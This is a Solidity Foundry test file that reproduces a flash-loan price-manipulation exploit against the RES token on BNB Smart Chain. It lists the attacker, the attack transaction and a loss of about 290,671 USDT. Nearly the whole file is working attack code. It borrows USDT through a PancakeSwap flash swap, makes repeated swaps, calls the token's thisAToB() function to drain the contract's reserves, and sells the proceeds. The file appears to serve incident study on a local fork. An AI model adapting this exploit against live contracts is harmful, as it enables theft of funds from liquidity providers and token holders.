// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// Total Lost :  290,671 USDT
// Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6
// Attack Contract : 0xff333de02129af88aae101ab777d3f5d709fec6f
// Vulnerable Contract : https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21 
// Attack Tx  0xe59fa48212c4ee716c03e648e04f0ca390f4a4fc921a890fded0e01afa4ba96d


CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

contract Attacker is Test {
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant alltoken = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);


    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IPancakePair constant usdtwbnbpair =  IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair

    IPancakePair constant usdtrespair =  IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A); // usdt/res Pair

    IPancakePair constant allusdtpair = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb); //all/usdt pair

    RES constant restoken = RES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);

    function setUp() public {
        cheat.createSelectFork("bsc", 21948016);
    }

    function stringsEquals(bytes calldata s1, string memory s2) private returns (bool) {
        bytes memory b1 = bytes(s1);
       
        bytes memory b2 = bytes(s2);
 
        uint256 l1 = b1.length;
        if (l1 != b2.length) return false;
        for (uint256 i=0; i<l1; i++) {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }


    function testExploit() public {
        emit log_named_decimal_uint("[Start]  USDT Balance Of Hacker:", usdt.balanceOf(address(this)), 18);

        usdtwbnbpair.swap(10014120886666860414836616,0, address(this), "borrowusdt");

        emit log_named_decimal_uint("[Over]  USDT Balance Of Hacker:", usdt.balanceOf(address(this)), 18);
        
    }

    function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
    ) external {
        if(stringsEquals(data, "borrowusdt")){
            emit log_named_decimal_uint("[Flashloan] now Hacker usdt balance is :", usdt.balanceOf(address(this)), 18);

            usdt.approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);

            address[] memory path = new address[](2);
            path[0] = address(0x55d398326f99059fF775485246999027B3197955);
            path[1] = address(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
            
            emit log_named_decimal_uint("[FlashLoan]  Res Token Balance Of address(user):", restoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)), 8);
            
            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,476862899365088591182696);

            // use flashswap will get more than buy
            usdtrespair.swap(0, 71519292481906 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 1 over");
            
            
            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,953725798730177182365392);

            usdtrespair.swap(0, 22030478307020 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 2 over");

            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,1430588698095265773548088);

            usdtrespair.swap(0, 7810673572823 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 3 over");

            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,1907451597460354364730784);

            usdtrespair.swap(0, 3504534400905 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 4 over");

            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,2384314496825442955913480);

            usdtrespair.swap(0, 1845944923363 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 5 over");

            usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A,2861177396190531547096176);

            usdtrespair.swap(0, 1084945873965 , address(0x3F693Effc53908d517F186A20431f756C90c2229), "");

            console.log("[FlashLoan] swap 6 over");

            // cost contract usd
            restoken.thisAToB();

            // token can't support transfer to contract
            cheat.prank(0x3F693Effc53908d517F186A20431f756C90c2229);
            restoken.approve(address(this), type(uint256).max);
            
            cheat.prank(0x3F693Effc53908d517F186A20431f756C90c2229);
            alltoken.approve(address(this), type(uint256).max);


            uint res_balance = restoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));
            
            emit log_named_decimal_uint("[FlashLoan]  Res Token Balance Of address(user):", res_balance, 8);
            
            emit log_named_decimal_uint("[FlashLoan]  All Token Balance Of address(user):", alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)), 18);

            uint256 alltoken_balance =  alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));
            

            alltoken.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, 0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb, alltoken_balance);

            console.log("transfer all token over");

            
            (uint256 reserve0, uint256 reserve1, uint32 blockTimestampLast) = allusdtpair.getReserves();
            
            uint256 get_value =  (alltoken_balance * reserve1 )/ (alltoken_balance  + reserve0) ; 

        
            uint256 getusdamount = get_value - ( (get_value*10/10000));

            allusdtpair.swap(0, getusdamount, address(this), "");

            emit log_named_decimal_uint("[FlashLoan] sell Alltoken over, Hacker usdt balance is :", usdt.balanceOf(address(this)), 18);

            restoken.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, 0x05ba2c512788bd95cd6D61D3109c53a14b01c82A, res_balance);
            
            usdtrespair.swap(1905851854454828201052166, 0 , address(this), "");

            emit log_named_decimal_uint("[FlashLoan] sell Restoken over, Hacker usdt balance is :", usdt.balanceOf(address(this)), 18);

            uint256 refund = amount0 + ((amount0 *251/100000));
            usdt.transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, refund);

        }
        else{
          console.log("error");
        }
    
    }


    receive() external payable {}
}

interface RES {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function _decimals() external view returns (uint8);

    function _lpAddress() external view returns (address);

    function _name() external view returns (string memory);

    function _referee(address) external view returns (address);

    function _swapV2Pair() external view returns (address);

    function _symbol() external view returns (string memory);

    function addBlack(address addressBlack) external;

    function addWhite(address addressWhite) external;

    function addWhiteContract(address addressWhite) external;

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function bindReferee(address addr) external returns (bool success);

    function burn(uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        returns (bool);

    function getOwner() external view returns (address);

    function increaseAllowance(address spender, uint256 addedValue)
        external
        returns (bool);

    function mint(uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function owner() external view returns (address);

    function renounceOwnership() external;

    function setBuyFee(uint256 buyFee) external;

    function setFoundationAddress(address foundationAddress) external;

    function setLpAddress(address lpAddress) external;

    function setMinAToB(uint256 min) external;

    function setPropagandaAddress(address propagandaAddress) external;

    function setSellFee(uint256 sellFee) external;

    function symbol() external view returns (string memory);

    function thisAToB() external;

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transferOwnership(address newOwner) external;
}
